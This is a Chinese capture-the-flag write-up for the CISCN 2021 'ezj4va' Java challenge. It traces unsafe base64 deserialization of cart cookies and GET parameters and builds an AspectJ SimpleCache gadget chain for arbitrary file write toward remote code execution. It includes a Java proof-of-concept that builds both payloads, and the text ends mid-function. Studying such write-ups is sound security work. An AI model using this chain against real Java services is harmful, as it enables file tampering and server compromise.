# CISCN 2021 ezj4va与Fix思路
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
>
> 比赛过程中发现了漏洞点并且提示是写入文件然后rce，不过在封装恶意类的时候一直报错，然后就一直到比赛结束也没有调试出来，不过之后问了Mrkaixin师傅发现自己的一下小问题，然后在问了学长hpdoger给了思路可能是springboot任意选择文件写到rce的利用，于是自己又打开了idea开始研究。再次非常感谢Mrkaixin师傅和学长朱师傅。
## 搭建环境
在比赛中我们可以访问robots.txt访问源代码，然后下载之后在本地搭建，使用maven环境，这里有点配置环境自己想办法咯，因为比赛的时候是断网的，还好自己之前下载了很多包使用，搭建之后就可以看一下项目目录。
项目启动详细在launch/Main可以看到，并且是以tomcat启动端口8081。
## 代码审计
接下来就是代码审计，审计思路是先看控制器controller。在IndexController控制器中存在下载功能也就是下载我们的源代码，不过并没有任意文件下载。。。。
然后在看CartController控制器里面根据不同的路由触发不同的操作而都是简单的操作，添加add 查询query 删除remove操作。
简单的看了一下具体的操作都是我们可以控制get参数skus和cookie值
并且每个操作下都有对参数值进行了序列化和反序列化操作。然后跟进发现有一个接口，是其具体方法的实现。
我们就看一个基本上就可以了，如下我们看addToCart方法。将我们的参数值进行反序列化之后添加到map集合里面。
其他的操作一样，然后看看反序列化的实现，可以发现是直接反序列化base64编码的参数。
然后基本上了解了大体上项目是思路，我们可以控制get参数和cookie参数并且去执行添加查询删除操作，
**注意一点这里的get参数和cookie参数必须为Cart类。不然会报错。**
然后在比赛中自己发现query方法的实现非常简单直接进行反序列化操作。
当时感觉wc!直接利用cc链直接打啊，然后去满怀期待的看看pom.xml文件。。。
并没有cc组件和漏洞组件。。。这里的fastjson和aspectj是自己修改的版本因为不想在下载其他的。而对于fastjson原来版本是1.2.72无漏洞除非有0day!并且也利用不了。而aspectj原版本是1.9.5，然后让队友去利用可以上网的靶机搜索aspectj版本漏洞果然有一个写入文件漏洞，需要配合cc链，而项目并没有cc组件。那就先看aspectj的利用文章。
看看调用栈
    Gadget chain:
    HashSet.readObject()
        HashMap.put()
            HashMap.hash()
                TiedMapEntry.hashCode()
                    TiedMapEntry.getValue()
                        LazyMap.get()
                            SimpleCache$StorableCachingMap.put()
                                SimpleCache$StorableCachingMap.writeToPath()
                                    FileOutputStream.write()
看了这个之后，大概懂了为什么需要cc组件，TiedMapEntry和LazyMap都是cc组件里面的类。所以前面的我们根本不能使用，然后看下面的需要了
SimpleCache$StorableCachingMap#put，回顾我们之前项目的操作过程，里面是不是操作了一个put方法将数据put到map集合里面?那这链子不是就通了？
所以现在的调用栈
    Gadget chain:
    CartServiceImpl.addToCart() //反序列化成cart对象
        Deserializer.readObject()
            CartServiceImpl.addToCart()//存在put方法
                SimpleCache$StorableCachingMap.put()
                    SimpleCache$StorableCachingMap.writeToPath()
                        FileOutputStream.write()
然后在看看最后的写入文件过程
然后调用writeToPath方法
文件内容和文件里面的值我们都可以控制，所以可以成功写入文件。
## 构造poc
因为前文件说了控制的参数需要是cart类，不能反序列化的所以要报错。所以我们直接在项目domain/cart里面构造。
首先我们让cookie序列化之后的cart类的SkuDescribe首先为我们的恶意类SimpleCache，并且类型为一个map。这样需要注意一下不然构造poc的时候报错。
这里我们可以利用一部分yso里面的poc。然后直接给setSkuDescribe进去一个恶意的对象simpleCache，这里需要注意一下因为SimpleCache类的内部类StoreableCachingMap属性是private的要报错，解决的方法是在当前项目目录下建立一样的类并且修改内部类StoreableCachingMap的属性为public。
    Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
    Object simpleCache = ctor.newInstance(".", 12);//获得obj
直接set进去要报错因为数据类型不匹配，也正是我前面说的SkuDescribe类型是map，然后我们就封装成map就欧克。
    cart.setSkuDescribe((Map) simpleCache);
然后我们cookie参数获得构造好了，之后在构造我们的get数据写入文件。
我们还是直接setSkuDescribe一个Map进去，map的key为文件名value为文件内容。
    Map map = new HashMap();
    String filepath = "1.txt";
    String data = readFile(filepath);//自己写了一个读文件的函数
    map.put("2.txt",data.getBytes(StandardCharsets.UTF_8));//编码
    cart.setSkuDescribe(map);
然后一起将get和cookie的值进行base64编码发送就欧克就能成功写入文件。
###  完整的poc
    public static String readFile(String filePath) throws Exception{
        // 根据path路径实例化一个输入流的对象
        FileInputStream  fis = new FileInputStream(filePath);
        //2. 返回这个输入流中可以被读的剩下的bytes字节的估计值；
        int size = fis.available();
        System.out.println(size);
        //3. 根据输入流中的字节数创建byte数组；
        byte[] array = new byte[size];
        //4.把数据读取到数组中；
        fis.read(array);
        //5.根据获取到的Byte数组新建一个字符串，然后输出；
        String result = new String(array);
        result = result.replaceAll("\r|\n", "");
        fis.close();
        return result;
    }
    public static Cart cookiePayload() throws Exception {
        Cart cart = new Cart();
        Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Object simpleCache = ctor.newInstance(".", 12);//获得obj
        cart.setSkuDescribe((Map) simpleCache);
        return cart;
    }
    public static Cart getPayload() throws Exception {
        Map map = new HashMap();
        Cart cart = new Cart();
        String filepath = "1.txt";
        String data = readFile(filepath);
        map.put("2.txt",data.getBytes(StandardCharsets.UTF_8));//编码
        cart.setSkuDescribe(map);
        return cart;
    }
    public static String getURLEncoderString(String str) {
        String result = "";
        if (null == str) {
            return "";
        }
        try {
            result = java.net.URLEncoder.encode(str, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return result;
    }
    public static String URLDecoderString(String str) {
        String result = "";
        if (null == str) {
            return "";
        }
        try {
            result = java.net.URLDecoder.decode(str, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();